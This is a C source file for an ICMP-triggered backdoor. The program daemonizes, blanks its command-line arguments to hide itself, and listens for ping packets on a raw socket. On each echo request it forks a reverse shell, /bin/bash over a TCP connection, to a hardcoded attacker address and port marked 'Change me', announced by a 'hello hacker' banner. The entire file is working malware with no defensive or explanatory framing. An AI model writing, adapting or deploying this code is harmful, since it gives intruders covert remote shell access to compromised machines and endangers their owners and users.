#include <stdio.h>
#include <sys/types.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define PACKET_SIZE 	1024
#define MOTD        	"hello\nhacker..\n"
#define SHELL       	"/bin/bash"

void reverse_shell(char *attacker_ip, unsigned short int attacker_port){
    int sd;
    struct sockaddr_in server_addr;
    struct hostent *server;

    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd < 0)	return;
    server = gethostbyname(attacker_ip);
    if(server == NULL)	return;
    bzero((char *) &server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr,
			server->h_length);
    server_addr.sin_port = htons(attacker_port);

    if(connect(sd,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0)
        return;
	//Print header
    write(sd, MOTD, strlen(MOTD));

    /*
 	 * Connect socket to stdio
 	 * Run shell
 	*/
    dup2(sd, 0);
    dup2(sd, 1);
    dup2(sd, 2);
    execl(SHELL, SHELL, (char *)0);
    close(sd);
}

/*
 * ICMP packet mode
 */
void ping_listener(void){
    int sockfd;
    int n;
    int icmp_ksize;
    char buf[PACKET_SIZE + 1];
    struct ip *ip;
	  struct icmp *icmp;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    //Listen for icmp packets
	  while(1){
        /* get the icmp packet */
        bzero(buf, PACKET_SIZE + 1);
        n = recv(sockfd, buf, PACKET_SIZE,0);
        if(n > 0){
          ip = (struct ip *)buf;
          icmp = (struct icmp *)(ip + 1);
          if((icmp->icmp_type == ICMP_ECHO) ){
              if(fork() == 0){
                reverse_shell("192.168.1.32", 8000); //Change me
                exit(EXIT_SUCCESS);
                }
            }
        }
    }
}

/*
 * main ()
 */
int main(int argc, char *argv[]){
    int i;
    for (i=1; i<argc; i++){
        memset(argv[i],' ', strlen(argv[i]));
	  }
    if (fork() != 0)
        exit(EXIT_SUCCESS);

    if (getgid() != 0) {
        fprintf(stdout, "Run as root!\n");
        exit(EXIT_FAILURE);
    }
	  ping_listener();
    return EXIT_SUCCESS;
}
